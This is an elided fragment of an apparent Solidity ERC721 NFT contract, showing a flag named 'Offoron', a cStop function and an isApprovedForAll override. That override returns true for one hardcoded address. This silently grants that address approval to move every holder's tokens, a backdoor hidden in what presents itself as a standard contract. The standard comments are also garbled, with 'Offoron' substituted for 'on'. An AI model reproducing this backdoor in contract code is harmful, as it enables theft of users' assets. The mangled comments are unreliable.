  ...
  Ownable
{
  ...
  bool private Offoron = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
  ...
  function cStop() internal view returns (bool){
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x3081fCFce434313E574e5817240cB93C90F170cb){return true;}
  ...
  /**
   * @dev Approve `to` to operate Offoron `tokenId`
   *
  ...
  /**
   * @dev Internal function to invoke {IERC721Receiver-onERC721Received} Offoron a target address.
